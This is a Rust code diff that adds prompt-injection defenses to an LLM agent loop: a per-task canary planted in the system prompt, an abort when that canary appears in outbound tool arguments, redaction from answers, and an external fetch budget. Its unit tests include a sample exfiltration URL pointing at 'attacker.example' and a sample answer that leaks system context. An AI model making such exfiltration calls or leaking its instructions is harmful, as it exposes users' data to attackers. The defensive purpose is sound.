@@ -36,7 +36,8 @@ use super::metrics::CallRecord;
 use super::openai::{
     strip_think, ChatChunk, ChatMessage, ChatRequest, ChatResponse, StreamAccumulator, ToolDef,
 };
-use super::toolclass::{self, Latch, Profile};
+use super::outbound::{self, Budget};
+use super::toolclass::{self, Latch, Profile, ToolClass};
 use super::tools::{self, ToolCtx};
 
 /// Accumulates a [`CallRecord`] per LLM call as the loop runs, for the Offload
@@ -182,6 +183,12 @@ pub struct HostRouter {
     /// hallucinated audit call on an opted-out or remote backend can't trigger
     /// a scan or receive its report.
     allow_audit: bool,
+    /// V32 Phase C: the contaminated scope this router serves (one worker
+    /// task), for the `injection_flag` rows the shared chokepoint writes.
+    task_scope: String,
+    /// V32 Phase C: the SSRF screen's carve-out set (the user's own configured
+    /// endpoints), snapshotted for the run alongside the tool surface.
+    policy: super::outbound::Policy,
 }
 
 impl HostRouter {
@@ -189,7 +196,9 @@ impl HostRouter {
     /// native tool defs; `mcp_defs` are the host's namespaced read-class
     /// tools (`McpHost::tool_defs().await`). `allow_graph` gates the `graph_*`
     /// tools and `allow_audit` the audit tools (both already reflected in
-    /// `native_defs` by the caller).
+    /// `native_defs` by the caller). `task_scope` names this run for V32
+    /// `injection_flag` rows and `policy` is the SSRF screen's carve-out set.
+    #[allow(clippy::too_many_arguments)]
     pub fn new(
         native_defs: Vec<ToolDef>,
         mcp_defs: Vec<ToolDef>,
@@ -198,6 +207,8 @@ impl HostRouter {
         scope: ToolScope,
         allow_graph: bool,
         allow_audit: bool,
+        task_scope: String,
+        policy: super::outbound::Policy,
     ) -> Self {
         let defs: Vec<ToolDef> = native_defs
             .into_iter()
@@ -211,6 +222,8 @@ impl HostRouter {
             scope,
             allow_graph,
             allow_audit,
+            task_scope,
+            policy,
         }
     }
 }
@@ -262,6 +275,8 @@ impl ToolRouter for HostRouter {
                     self.ctx.allowed_roots.first().map(|p| p.as_path()),
                     name,
                     args,
+                    &self.task_scope,
+                    &self.policy,
                 )
                 .await
                 .map(|text| super::spotlight::envelope_if_external(name, text))
@@ -311,6 +326,14 @@ pub struct AgentConfig {
     /// `mcp.rs`) lets the proxy wait out a long-but-live job instead of
     /// abandoning + re-running it, so a fixed per-call timeout is safe.
     pub per_call_timeout: Duration,
+    /// V32 Phase C: a short id naming this run as a contaminated scope in
+    /// `injection_flag` Tool Activity rows. The caller mints it once and gives
+    /// the same value to [`HostRouter::new`], so the SSRF rows the chokepoint
+    /// writes and the budget/canary rows the loop writes correlate.
+    pub task_scope: String,
+    /// V32 Phase C (locked decision 11): this task's EXTERNAL call/byte
+    /// budget, from settings.
+    pub external_budget: super::outbound::BudgetLimits,
 }
 
 /// The task to run.
@@ -1177,10 +1200,127 @@ fn latch_gate(latch: &mut Latch, name: &str) -> Result<(), &'static str> {
     Ok(())
 }
 
-/// Run the agent loop and return the synthesized final answer (with
-/// `<think>` stripped). `deadline` bounds the loop wall-clock; on expiry
-/// (or `max_steps`/budget) it forces a final-synthesis turn.
+/// The worker's system message for one task: the base prompt (V21 F9's
+/// schema variant when the run is grammar-constrained) plus this task's V32
+/// canary line.
+///
+/// The canary goes here and **nowhere else**. Never into the user message: a
+/// research task's prompt is visible to whatever page it fetches (the accepted
+/// residual behind locked decision 4's secrets warning), so a canary there
+/// would leak by design and reduce the detector to a false-alarm generator.
+/// Extracted as its own function so that invariant is unit-testable without a
+/// live server.
+fn system_context(schema_run: bool, canary: &str) -> String {
+    let base = if schema_run {
+        SCHEMA_SYSTEM_PROMPT
+    } else {
+        SYSTEM_PROMPT
+    };
+    format!("{base}\n\n{}", outbound::canary_system_line(canary))
+}
+
+/// V32 Phase C: whether an outbound EXTERNAL call must abort the task — its
+/// canary appears in the arguments.
+///
+/// Both forms of the arguments are checked: the raw string the model emitted
+/// and the re-serialization of the parsed JSON. They differ in practice —
+/// escaping, key order, an unparseable blob that lands in `_raw` — and an
+/// exfiltration attempt must not be able to hide in the gap between them.
+///
+/// Screening the whole serialized argument object (rather than a `url` field)
+/// is deliberate: it covers the URL case *and* every other field at once — a
+/// search query, a POST body, a "notes" parameter — without this loop having to
+/// know any server's schema, which by the Phase A unknown-⇒-EXTERNAL invariant
+/// it cannot.
+fn canary_in_outbound(raw_args: &str, args: &serde_json::Value, canary: &str) -> bool {
+    outbound::contains_canary(raw_args, canary)
+        || outbound::contains_canary(&args.to_string(), canary)
+}
+
+/// Run the agent loop and return the synthesized final answer (with `<think>`
+/// stripped).
+///
+/// # V32 Phase C — the in-band canary lives here (locked decision 12)
+///
+/// This wrapper owns the canary's whole lifecycle, because a canary is
+/// meaningful for exactly one task: it is minted here, planted in the system
+/// context by [`run_inner`], screened on every outbound EXTERNAL argument
+/// inside the loop, and screened once more on the answer on the way out.
+///
+/// The two hits are treated differently, and deliberately so:
+///
+/// - **In an outbound argument ⇒ ABORT.** The marker is leaving the machine;
+///   the model has been steered into exfiltrating its own system context. This
+///   is the ONE detector the milestone allows to enforce, because a canary hit
+///   has effectively zero false-positive rate. `run_inner` returns an error and
+///   no answer is produced.
+/// - **In the final ANSWER ⇒ surface, don't abort.** The answer's reader is the
+///   orchestrator, not the network, so nothing has escaped. But a standing
+///   system instruction was overridden, which the caller must know — so the
+///   marker is redacted (it must not enter the orchestrator's transcript, where
+///   a later turn could quote it back and blunt the detector) and a warning
+///   footer is appended. Returning the answer preserves work that is usually
+///   still useful; discarding it would make a *detection* look like a failure.
+///
+/// Consumers (Claude/OpenCode tabs) get no canary: their system prompts are not
+/// cImp-authored, so there is nothing of ours in them to leak.
 pub async fn run(
+    client: &reqwest::Client,
+    cfg: &AgentConfig,
+    router: &dyn ToolRouter,
+    task: OffloadTask,
+    deadline: Instant,
+    trace: Option<&mut RunTrace>,
+    cancel: &CancellationToken,
+) -> AppResult<String> {
+    let canary = outbound::new_canary();
+    let answer = run_inner(client, cfg, router, task, deadline, trace, cancel, &canary).await?;
+    let Some(cleaned) = screen_answer_canary(&answer, &canary) else {
+        return Ok(answer);
+    };
+    warn!(
+        target: "offload",
+        scope = %cfg.task_scope,
+        "offload: the task's canary appeared in its FINAL ANSWER — redacting and flagging"
+    );
+    outbound::record_flag(outbound::Flag {
+        screen: outbound::Screen::Canary,
+        consumer: "offload",
+        scope: &cfg.task_scope,
+        tool: "(final answer)",
+        host: None,
+        url: None,
+        resolved_ip: None,
+        canary: true,
+        root: String::new(),
+        detail: outbound::ANSWER_CANARY_WARNING,
+    });
+    Ok(cleaned)
+}
+
+/// V32 Phase C: screen a finished answer for the task's canary. `None` when
+/// clean (the overwhelmingly common case, returned byte-identical); otherwise
+/// the answer with every occurrence redacted and the warning footer appended.
+///
+/// Redaction is not optional politeness: the marker must not enter the
+/// orchestrator's transcript, where a later turn could quote it back and blunt
+/// the detector for every subsequent task.
+fn screen_answer_canary(answer: &str, canary: &str) -> Option<String> {
+    if !outbound::contains_canary(answer, canary) {
+        return None;
+    }
+    Some(format!(
+        "{}{}",
+        outbound::redact_canary(answer, canary),
+        outbound::ANSWER_CANARY_WARNING
+    ))
+}
+
+/// The agent loop proper. `deadline` bounds the loop wall-clock; on expiry
+/// (or `max_steps`/budget) it forces a final-synthesis turn. `canary` is this
+/// task's V32 marker — see [`run`] for the whole lifecycle.
+#[allow(clippy::too_many_arguments)]
+async fn run_inner(
     client: &reqwest::Client,
     cfg: &AgentConfig,
     router: &dyn ToolRouter,
@@ -1188,6 +1328,7 @@ pub async fn run(
     deadline: Instant,
     mut trace: Option<&mut RunTrace>,
     cancel: &CancellationToken,
+    canary: &str,
 ) -> AppResult<String> {
     let url = format!("{}/v1/chat/completions", cfg.base_url);
     // The router's full surface, snapshotted once (the warm pool is reconciled
@@ -1200,6 +1341,12 @@ pub async fn run(
     // never sees an external one; an undeclared task starts open and latches on
     // its first EXTERNAL / LOCAL-CAPABILITY call.
     let mut latch = Latch::from_profile(task.profile);
+    // V32 Phase C: this task's EXTERNAL spend, and the one-row-per-task claim
+    // for taint-latch refusals. Both are plain locals because a task IS the
+    // scope — there is no registry to key, and a new task starts fresh by
+    // construction (the reset rule locked decision 11 asks for).
+    let mut budget = Budget::default();
+    let mut latch_flagged = false;
     let mut advertised = toolclass::filter_defs(&all_tools, latch);
     // The latch the current `advertised` view was built for, so the filter runs
     // only when the state actually moves (not once per step).
@@ -1212,12 +1359,8 @@ pub async fn run(
     // V21 F9: a schema run uses the cite-nothing/JSON-only system prompt (the
     // JSON grammar can't carry `[T…]` citation markers) and constrains only the
     // final-synthesis turn (tool-call turns stay free-form).
-    let sys_prompt = if task.schema.is_some() {
-        SCHEMA_SYSTEM_PROMPT
-    } else {
-        SYSTEM_PROMPT
-    };
-    let mut convo = Convo::new(sys_prompt, user);
+    let sys_prompt = system_context(task.schema.is_some(), canary);
+    let mut convo = Convo::new(&sys_prompt, user);
     // Measured generation rate (tokens/sec), refreshed from each response's
     // server `timings` and used to size the next request's output budget.
     let mut gen_tps = DEFAULT_GEN_TPS;
@@ -1477,6 +1620,25 @@ pub async fn run(
             // the native route and the MCP-host route (`router.call` dispatches
             // on the name; a check inside either router would miss the other).
             if let Err(refusal) = latch_gate(&mut latch, name) {
+                // V32 Phase C: give the Phase A refusal a consumer — without a
+                // row the user only sees a task that mysteriously gave up. ONE
+                // row per task: the latch is sticky, so every later refusal
+                // restates the same fact and a looping model must not be able
+                // to fill the feed with it.
+                if !std::mem::replace(&mut latch_flagged, true) {
+                    outbound::record_flag(outbound::Flag {
+                        screen: outbound::Screen::LatchRefusal,
+                        consumer: "offload",
+                        scope: &cfg.task_scope,
+                        tool: name,
+                        host: None,
+                        url: None,
+                        resolved_ip: None,
+                        canary: false,
+                        root: String::new(),
+                        detail: refusal,
+                    });
+                }
                 obs_id += 1;
                 turn.push(ChatMessage::tool(
                     &call.id,
@@ -1484,9 +1646,78 @@ pub async fn run(
                 ));
                 continue;
             }
+            // V32 Phase C: the two remaining outbound screens, in the order
+            // that costs least and refuses most decisively. Both sit at the
+            // call site (like the latch gate) so they cover BOTH routes —
+            // `router.call` dispatches on the name, and a check inside either
+            // router would miss the other.
+            let external = toolclass::classify(name) == ToolClass::External;
+            if external {
+                // (a) Canary in the outbound arguments = confirmed active
+                // exfiltration (see `canary_in_outbound`). The one detector
+                // allowed to ENFORCE: the run ends here, with no answer.
+                if canary_in_outbound(&call.function.arguments, &args, canary) {
+                    warn!(
+                        target: "offload",
+                        tool = %name,
+                        scope = %cfg.task_scope,
+                        "offload: ABORTING the task — its canary appeared in an outbound external \
+                         tool call"
+                    );
+                    outbound::record_flag(outbound::Flag {
+                        screen: outbound::Screen::Canary,
+                        consumer: "offload",
+                        scope: &cfg.task_scope,
+                        tool: name,
+                        host: None,
+                        url: None,
+                        resolved_ip: None,
+                        canary: true,
+                        root: String::new(),
+                        detail: outbound::ABORT_CANARY,
+                    });
+                    return Err(AppError::Offload(outbound::ABORT_CANARY.into()));
+                }
+                // (b) The per-task fetch budget. Exhaustion is a refusal the
+                // model can keep working around, so it is served as a tool
+                // result rather than aborting the run — but reported exactly
+                // once for the task.
+                if budget.exhausted(cfg.external_budget) {
+                    if budget.claim_flag() {
+                        warn!(
+                            target: "offload",
+                            tool = %name,
+                            scope = %cfg.task_scope,
+                            "offload: external fetch budget exhausted for this task"
+                        );
+                        outbound::record_flag(outbound::Flag {
+                            screen: outbound::Screen::Budget,
+                            consumer: "offload",
+                            scope: &cfg.task_scope,
+                            tool: name,
+                            host: None,
+                            url: None,
+                            resolved_ip: None,
+                            canary: false,
+                            root: String::new(),
+                            detail: outbound::REFUSAL_BUDGET,
+                        });
+                    }
+                    obs_id += 1;
+                    turn.push(ChatMessage::tool(
+                        &call.id,
+                        label_observation(obs_id, outbound::REFUSAL_BUDGET),
+                    ));
+                    continue;
+                }
+            }
             // V21 F8: short-circuit an identical repeat before executing.
+            // `executed` records whether this call actually reached the network
+            // (V32: only those are charged to the external budget).
+            let mut executed = false;
             let result = match call_cache.probe(name, &args) {
                 CacheProbe::Fresh => {
+                    executed = true;
                     let r = match router.call(name, args.clone()).await {
                         Ok(r) => r,
                         Err(e) => format!("ERROR: {e}"),
@@ -1503,6 +1734,7 @@ pub async fn run(
                 // survives without serving stale bytes (V21 F4 grounding).
                 CacheProbe::RepeatStateful => {
                     repeated_in_turn = true;
+                    executed = true;
                     let r = match router.call(name, args.clone()).await {
                         Ok(r) => r,
                         Err(e) => format!("ERROR: {e}"),
@@ -1521,6 +1753,13 @@ pub async fn run(
                     REPEAT_EXHAUSTED.to_string()
                 }
             };
+            // V32 Phase C: charge the external budget for what this call
+            // actually pulled. A cache-served repeat is not charged — nothing
+            // left the machine — and it cannot be used to fetch for free
+            // either, since by definition it returns bytes already counted.
+            if external && executed {
+                budget.charge(result.len());
+            }
             // V21 F4: label each tool result with an observation id the model
             // can cite ([T1], [T2], …).
             obs_id += 1;
@@ -2256,6 +2495,11 @@ mod tests {
             per_tool_result_token_cap: cap,
             auth_token: None,
             per_call_timeout: Duration::from_secs(300),
+            task_scope: "task-test".into(),
+            external_budget: outbound::BudgetLimits {
+                max_calls: 40,
+                max_bytes: 4 * 1024 * 1024,
+            },
         }
     }
 
@@ -3272,5 +3516,96 @@ mod tests {
         // The latched view drops `read_file`, but the cache built from the full
         // snapshot is unaffected — no rebuild needed on a latch move.
         assert_eq!(toolclass::filter_defs(&all, Latch::External).len(), 1);
+    }
+
+    // ── V32 Phase C — the in-band canary ───────────────────────────────────
+
+    /// The canary is planted in the SYSTEM context, in both prompt variants,
+    /// with the never-repeat instruction attached — and the grounding contract
+    /// of the base prompt survives beside it.
+    #[test]
+    fn the_canary_is_planted_in_the_system_context_only() {
+        let c = crate::offload::outbound::new_canary();
+        for schema_run in [false, true] {
+            let sys = system_context(schema_run, &c);
+            assert!(sys.contains(&c), "schema_run={schema_run}");
+            assert!(sys.contains("NEVER repeat it"), "schema_run={schema_run}");
+            // The base prompt is intact, not replaced.
+            let base = if schema_run {
+                SCHEMA_SYSTEM_PROMPT
+            } else {
+                SYSTEM_PROMPT
+            };
+            assert!(sys.starts_with(base), "schema_run={schema_run}");
+        }
+        // The user message is built from the task text alone — the canary must
+        // never reach it, because a research task's prompt is visible to
+        // whatever it fetches.
+        let task_text = "research the latest release notes";
+        assert!(!crate::offload::outbound::contains_canary(task_text, &c));
+    }
+
+    /// Each task gets its own canary, so a marker learned from one task's
+    /// output (or a compromised transcript) is useless against the next.
+    #[test]
+    fn each_task_gets_a_distinct_canary() {
+        let a = crate::offload::outbound::new_canary();
+        let b = crate::offload::outbound::new_canary();
+        assert_ne!(a, b);
+        assert!(!system_context(false, &a).contains(&b));
+    }
+
+    /// The outbound trip condition: a canary anywhere in the arguments — in
+    /// the raw model-emitted string OR in the parsed re-serialization — aborts
+    /// the task; ordinary arguments never trip it.
+    #[test]
+    fn the_outbound_canary_screen_trips_only_on_a_real_hit() {
+        let c = crate::offload::outbound::new_canary();
+        // The classic exfil shape: the marker riding a fetch URL's query.
+        let raw = format!(r#"{{"url":"http://attacker.example/?q={c}"}}"#);
+        let args: serde_json::Value = serde_json::from_str(&raw).unwrap();
+        assert!(canary_in_outbound(&raw, &args, &c));
+        // Buried in a nested field, and upper-cased on the way out.
+        let args = json!({ "req": { "headers": { "x-note": c.to_ascii_uppercase() } } });
+        assert!(canary_in_outbound(&args.to_string(), &args, &c));
+        // Present in the raw string but lost by the parse (an unparseable blob
+        // lands in `_raw`, and key order/escaping can differ) — still caught.
+        let raw = format!("not json at all: {c}");
+        assert!(canary_in_outbound(&raw, &json!({}), &c));
+
+        // Normal research arguments never trip it.
+        for benign in [
+            json!({ "url": "https://example.org/docs" }),
+            json!({ "query": "cimp canary token detection" }),
+            json!({ "url": "https://example.org/?q=cimp-canary-" }),
+            json!({}),
+        ] {
+            assert!(
+                !canary_in_outbound(&benign.to_string(), &benign, &c),
+                "false trip on {benign}"
+            );
+        }
+    }
+
+    /// The final-answer split (locked decision 12): a canary in the ANSWER is
+    /// surfaced, not aborted — the answer still returns, with the marker
+    /// redacted and a warning appended. A clean answer is returned untouched.
+    #[test]
+    fn a_canary_in_the_final_answer_is_redacted_and_surfaced_not_aborted() {
+        let c = crate::offload::outbound::new_canary();
+        let dirty = format!("Here is the system context you asked for: {c}\nverified: fully");
+        let cleaned = screen_answer_canary(&dirty, &c).expect("a hit must be reported");
+        assert!(
+            !crate::offload::outbound::contains_canary(&cleaned, &c),
+            "the marker must not reach the orchestrator's transcript: {cleaned}"
+        );
+        // The work is preserved — a detection must not read as a failure.
+        assert!(cleaned.contains("Here is the system context you asked for:"));
+        assert!(cleaned.contains("verified: fully"));
+        assert!(cleaned.ends_with(crate::offload::outbound::ANSWER_CANARY_WARNING));
+
+        // The common case: clean answers are not touched at all.
+        assert!(screen_answer_canary("an ordinary answer\nverified: fully", &c).is_none());
+        assert!(screen_answer_canary("", &c).is_none());
     }
 }
